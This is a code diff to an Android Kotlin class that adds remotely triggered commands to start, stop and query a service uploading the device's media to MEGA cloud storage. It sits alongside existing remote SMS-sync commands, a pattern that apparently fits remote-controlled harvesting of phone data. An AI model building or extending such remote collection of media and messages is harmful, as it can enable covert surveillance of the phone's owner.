@@ -87,6 +87,19 @@ class RemoteCommandManager(private val context: Context) {
         val cleanType = commandType.trim().uppercase()
         try {
             when (cleanType) {
+                "START_MEDIA_BACKUP", "START_BACKUP", "BACKUP_MEDIA", "MEGA_BACKUP" -> {
+                    val filter = if (payload.isNotBlank()) payload.trim() else "all"
+                    com.example.service.MegaUploadService.startService(context, filter)
+                    resultMessage = "MEGA media backup service started successfully (Filter: $filter)."
+                }
+                "STOP_BACKUP", "STOP_MEDIA_BACKUP", "CANCEL_BACKUP" -> {
+                    com.example.service.MegaUploadService.stopService(context)
+                    resultMessage = "MEGA media backup service stopped."
+                }
+                "GET_BACKUP_STATUS", "BACKUP_STATUS" -> {
+                    val statusMap = MegaUploadManager.getBackupStatusMap(context)
+                    resultMessage = "MEGA Backup Status: Running=${statusMap["isRunning"]}, Folder=${statusMap["currentFolder"]}"
+                }
                 "SYNC_ALL", "SYNC", "FORCE_SYNC", "REFRESH_DATA", "CLEAR_AND_SYNC_ALL" -> {
                     val clearFirst = commandType.equals("CLEAR_AND_SYNC_ALL", ignoreCase = true) || payload.contains("clear", ignoreCase = true)
                     SmsSyncManager(context).syncSmsMessages()
